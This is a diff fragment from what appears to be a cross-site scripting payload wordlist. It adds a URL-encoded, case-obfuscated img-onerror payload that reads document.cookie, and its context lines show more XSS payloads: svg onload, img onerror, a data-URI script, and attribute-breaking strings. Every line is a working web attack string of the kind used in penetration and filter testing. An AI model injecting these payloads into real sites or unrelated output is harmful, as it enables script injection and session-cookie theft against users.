@@ -13,6 +13,7 @@ test@gmail.com%2527%5C%2522%253E%253Csvg%2Fonload%3Dalert%28%2Fxss%2F%29%253E   
 
 <img src=1 onerror=alert("XSS")>
 <img/src/onerror=prompt(document.domain)>
+"%3e%3cImG%20sRC=X%20OneRRoR=alert(document.cookie)%20"%3c
 <script src="data:text/javascript,alert(1)"></script>
 "><img src=1 onerror=alert("XSS")>
 "><img src=x onerror=alert(document.cookie)>
